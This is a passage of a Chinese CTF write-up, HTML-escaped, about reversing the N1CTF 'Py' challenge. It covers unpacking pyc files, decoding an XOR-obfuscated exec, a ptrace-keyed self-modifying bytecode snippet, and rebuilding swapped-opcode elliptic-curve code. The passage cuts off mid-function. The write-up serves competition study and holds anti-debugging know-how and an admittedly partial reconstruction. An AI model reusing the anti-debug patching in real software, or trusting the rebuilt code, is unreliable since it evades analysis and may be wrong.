    &lt;span style=&#34;color:#ae81ff&#34;&gt;142&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;149&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;154&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;133&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;168&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;133&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;146&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;
]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c, f &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; zip(cipher, fake_cipher):
    print (chr(c &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# A6C33EA2571A2AE26BFAE7BEA2CD8F54&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;n1ctfpy&#34;&gt;[N1CTF]Py&lt;/h2&gt;
&lt;p&gt;首先解包elf，能在目录下得到两个pyc&lt;/p&gt;
&lt;p&gt;修改文件头，&lt;code&gt;0a5n.py&lt;/code&gt; 为&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; L
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; var &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check_format&lt;/span&gt;(flag):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(flag) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; flag:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0123456789abcdef&amp;#39;&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;


v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; L&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;c1(v1, v2, v3)
v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; L&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;c2(v1, v4, v5)
k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag:&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; check_format(k) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
    v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; L&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;f3(k)
    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v6
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v3&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;a2 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; g1 &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; v3&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;a3 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; g2:
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Congratulations! n1ctf{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;L.py 中有乱码，还原字节码能得到两个exec&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;z = &#39;&#39;.join([chr(i ^ 2) for i in z])
exec(z)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里实际还原出来的是 &lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt; 运算，根据z中的数据猜测实际为 &lt;code&gt;^&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;能得到一个smc&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ctypes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CDLL(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc.so.6&amp;#34;&lt;/span&gt;)
_ptrace &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ptrace
key&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;_ptrace(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
_memcpy &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memcpy
key &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
address&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;id(f1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__code__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;co_code)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;bytes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__basicsize__&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
codes&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;list(f1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__code__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;co_code)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(codes)):codes[i]&lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt;key
codes&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytearray(codes)
buff&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(ctypes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;c_byte&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;len(codes))&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_buffer(codes)
_memcpy(ctypes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;c_char_p(address),ctypes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cast(buff,ctypes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;POINTER(ctypes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;c_char)),ctypes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;c_int(len(codes)))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;手动patch一下pyc文件，uncompyle6反编译后自己修复一下变量名，发现很多函数的逻辑很奇怪，根据刚才异或运算被解释成了左移运算，题目中的vm可能对基础运算符的opcode进行了相互的调换&lt;/p&gt;
&lt;p&gt;通过使用的参数和函数的形式，猜测应该是个ECC算法，对其进行还原（这里只猜到了opcode被替换，但没有想到去哪里查看新的opcode）&lt;/p&gt;
&lt;p&gt;肉眼还原了一下运算：把 &lt;code&gt;&amp;amp;&lt;/code&gt; 换成 &lt;code&gt;|&lt;/code&gt;， &lt;code&gt;|&lt;/code&gt; 换成 &lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;，&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt; 换成 &lt;code&gt;^&lt;/code&gt;，&lt;code&gt;^&lt;/code&gt; 换成 &lt;code&gt;+&lt;/code&gt;，&lt;code&gt;+&lt;/code&gt; 换成 &lt;code&gt;%&lt;/code&gt;，&lt;code&gt;%&lt;/code&gt; 换成 &lt;code&gt;-&lt;/code&gt;，&lt;code&gt;-&lt;/code&gt; 换成 &lt;code&gt;*&lt;/code&gt;，&lt;code&gt;**&lt;/code&gt; 换成 &lt;code&gt;//&lt;/code&gt;，&lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt; 换成 &lt;code&gt;&amp;amp;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;0a5n.py:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; L
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; var &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check_format&lt;/span&gt;(flag):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(flag) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; flag:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0123456789abcdef&amp;#39;&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;

v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; L&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;c1(v1, v2, v3)
v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; L&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;c2(v1, v4, v5)
k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag:&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; check_format(k) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
    v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; L&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;f3(k)
    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v6
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; v3&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;a2 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; g1 &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; v3&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;a3 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; g2:
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Congratulations! n1ctf{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; k)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;L.py:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;inv_mod&lt;/span&gt;(b, p):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; p &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; b:
        b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p
    c, d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b, p
    uc, vc, ud, vd, temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        temp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; c
        q, c, d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; c, d &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; c, temp
        uc, vc, ud, vd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ud &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; q &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; uc, vd &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; q &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; vc, uc, vc

    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ud &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ud
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ud &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;leftmost_bit&lt;/span&gt;(x):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; result &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; x:
        result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; result
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Curve&lt;/span&gt;(object):  &lt;span style=&#34;color:#75715e&#34;&gt;# c1&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, p, a, b):
        var4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p
        var4 &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10000000000000000000000000000000000000000&lt;/span&gt;L
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var4
        var5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a
        var5 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        var5 &lt;span style=&#34;color:#f92672&#34;&gt;//=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var5
        var6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b
        var6 &lt;span style=&#34;color:#f92672&#34;&gt;//=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        var6 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var6

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;s1&lt;/span&gt;(self, x, y):  &lt;span style=&#34;color:#75715e&#34;&gt;# 判断是否在曲线上&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (y &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; y) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;


&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Point&lt;/span&gt;(object):   &lt;span style=&#34;color:#75715e&#34;&gt;# c2&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, curve: Curve, x, y, order&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;curve &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; curve
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; y
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;order &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; order
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;a1:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;a1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;s1(x, y)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; order:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; self &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; order &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; g1

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __eq__(self, other):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;curve &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;curve &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __add__(self, other):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; other &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; g1:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; g1:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; other
        &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;curve &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;curve
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;curve&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; g1
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;s1()
        p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;curve&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p
        l &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;y &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; inv_mod(other&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;x, p) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p
